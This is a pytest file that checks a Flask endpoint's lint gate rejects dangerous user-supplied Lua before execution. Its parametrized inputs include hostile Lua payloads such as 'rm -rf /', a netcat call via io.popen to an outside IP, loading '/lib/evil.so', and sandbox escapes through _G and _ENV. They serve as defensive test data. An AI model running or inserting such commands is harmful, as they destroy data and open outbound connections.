"""W4: hard-reject lint gate on `/api/v1/workbench/execute`.

These tests verify that user-pasted Lua containing dangerous primitives is
rejected with HTTP 400 + structured `{"error": "hard_reject", "findings": ...}`
BEFORE the Lua is handed to the harness execution engine.
"""

import pytest
from flask import Flask

from components.web_ui import routes as routes_module


class _ServiceStub:
    pending_conversions: dict = {}

    def get_status(self):
        return {}

    def get_runtime_status(self):
        return {"metrics": {}, "reload_requests": {}, "pending_promotions": {}}

    def request_runtime_reload(self, parser_id):
        return False

    def pop_runtime_reload(self, parser_id):
        return None

    def request_canary_promotion(self, parser_id):
        return False

    def pop_canary_promotion(self, parser_id):
        return None


def _build_app(monkeypatch):
    """Build a Flask app whose harness internals fail loudly if the lint gate
    fails to short-circuit. If we ever reach `validity_checker.check(...)` /
    `execution_engine.execute(...)` with dangerous Lua, the test fails with
    a clear message instead of silently passing."""

    class FakeWorkbench:
        def _find_entry(self, parser_name):
            return {"parser_name": parser_name, "config": {"parser_name": parser_name}}

        def list_parsers(self):
            return []

        def build_parser(self, parser_name):
            return {
                "parser_name": parser_name,
                "example_log": '{"message":"from-example"}',
                "lua_code": "function processEvent(event) return event end",
            }

        def build_parser_with_agent(self, parser_name, force_regenerate=False):
            return None

        def _get_agent(self):
            return None

    class TripWireValidity:
        def check(self, lua_code):
            pytest.fail(
                "validity_checker.check() must NOT run before lint hard-reject "
                f"(received: {lua_code!r})"
            )

    class TripWireAnalyzer:
        def analyze(self, lua_code, ocsf_version):
            pytest.fail("ocsf_analyzer.analyze() must NOT run before lint hard-reject")

    class TripWireRegistry:
        def get_required_fields(self, class_uid, ocsf_version):
            pytest.fail("ocsf_registry.get_required_fields() must NOT run before lint hard-reject")

    class TripWireExecution:
        def execute(self, lua_code, test_events, ocsf_required_fields):
            pytest.fail("execution_engine.execute() must NOT run before lint hard-reject")

    class FakeHarness:
        def __init__(self):
            self.validity_checker = TripWireValidity()
            self.ocsf_analyzer = TripWireAnalyzer()
            self.ocsf_registry = TripWireRegistry()
            self.execution_engine = TripWireExecution()

        def run_all_checks(self, *args, **kwargs):
            return {}

        def run_single_check(self, *args, **kwargs):
            return {}

    def _no_auth(fn):
        return fn

    monkeypatch.setattr(routes_module, "ParserLuaWorkbench", FakeWorkbench)
    monkeypatch.setattr(routes_module, "HarnessOrchestrator", FakeHarness)

    app = Flask(__name__)
    app.config["TESTING"] = True
    routes_module.register_routes(
        app,
        service=_ServiceStub(),
        feedback_queue=None,
        runtime_service=None,
        event_loop=None,
        require_auth=_no_auth,
        rate_limiter=None,
    )
    return app


@pytest.mark.parametrize("dangerous_lua", [
    'function processEvent(event) os.execute("id"); return event end',
    'function processEvent(event) load("os.execute(\'id\')")(); return event end',
    'function processEvent(event) string.dump(processEvent); return event end',
    'function processEvent(event) _G["os"]["execute"]("rm -rf /"); return event end',
    'function processEvent(event) _ENV["io"]["popen"]("nc 1.2.3.4 443"); return event end',
    'function processEvent(event) _G["package"]["loadlib"]("/lib/evil.so", "evil"); return event end',
])
def test_execute_rejects_hard_reject_lua(monkeypatch, dangerous_lua):
    """POST to /api/v1/workbench/execute with dangerous Lua returns 400 with
    `error == "hard_reject"` and structured findings BEFORE harness execution."""
    app = _build_app(monkeypatch)
    client = app.test_client()

    response = client.post(
        "/api/v1/workbench/execute",
        json={
            "parser_name": "okta_logs-latest",
            "lua_code": dangerous_lua,
            "event": {"message": "test"},
        },
    )

    assert response.status_code == 400, (
        f"Expected 400 hard_reject for: {dangerous_lua!r}; got {response.status_code} "
        f"body={response.get_json()}"
    )
    payload = response.get_json()
    assert payload["error"] == "hard_reject"
    assert isinstance(payload["findings"], list)
    assert len(payload["findings"]) >= 1
    # Each finding has the documented shape from LuaLintResult.
    for finding in payload["findings"]:
        assert "pattern" in finding
        assert "description" in finding
    assert isinstance(payload.get("rejection_reason"), str)
    assert payload["rejection_reason"]


def test_execute_accepts_clean_lua(monkeypatch):
    """A clean OCSF-mapping script must NOT be rejected by the lint gate.

    Replaces the trip-wire harness components with permissive fakes for this
    specific test; if the lint gate were over-eager, the request would 400
    without ever reaching the harness fakes."""
    captured: dict = {}

    class PermissiveValidity:
        def check(self, lua_code):
            captured["validity_lua"] = lua_code
            return {
                "valid": True,
                "errors": [],
                "warnings": [],
                "function_signature": "processEvent",
            }

    class PermissiveAnalyzer:
        def analyze(self, lua_code, ocsf_version):
            return {"class_uid": 2001}

    class PermissiveRegistry:
        def get_required_fields(self, class_uid, ocsf_version):
            return ["class_uid", "time"]

    class PermissiveExecution:
        def execute(self, lua_code, test_events, ocsf_required_fields):
            captured["executed"] = True
            return {
                "function_signature": "processEvent",
                "total_events": 1,
                "passed": 1,
                "failed": 0,
                "results": [],
                "lupa_available": True,
            }

    class PermissiveHarness:
        def __init__(self):
            self.validity_checker = PermissiveValidity()
            self.ocsf_analyzer = PermissiveAnalyzer()
            self.ocsf_registry = PermissiveRegistry()
            self.execution_engine = PermissiveExecution()

        def run_all_checks(self, *args, **kwargs):
            return {}

        def run_single_check(self, *args, **kwargs):
            return {}

    class FakeWorkbench:
        def _find_entry(self, parser_name):
            return {"parser_name": parser_name, "config": {"parser_name": parser_name}}

        def list_parsers(self):
            return []

        def build_parser(self, parser_name):
            return {"parser_name": parser_name, "example_log": "{}", "lua_code": ""}

        def build_parser_with_agent(self, parser_name, force_regenerate=False):
            return None

        def _get_agent(self):
            return None

    def _no_auth(fn):
        return fn

    monkeypatch.setattr(routes_module, "ParserLuaWorkbench", FakeWorkbench)
    monkeypatch.setattr(routes_module, "HarnessOrchestrator", PermissiveHarness)

    app = Flask(__name__)
    app.config["TESTING"] = True
    routes_module.register_routes(
        app,
        service=_ServiceStub(),
        feedback_queue=None,
        runtime_service=None,
        event_loop=None,
        require_auth=_no_auth,
        rate_limiter=None,
    )

    clean_lua = (
        "function processEvent(event)\n"
        "    event.class_uid = 2001\n"
        "    event.activity_id = 1\n"
        "    return event\n"
        "end\n"
    )
    response = app.test_client().post(
        "/api/v1/workbench/execute",
        json={
            "parser_name": "okta_logs-latest",
            "lua_code": clean_lua,
            "event": {"message": "hi"},
        },
    )
    assert response.status_code == 200, response.get_json()
    assert captured.get("executed") is True
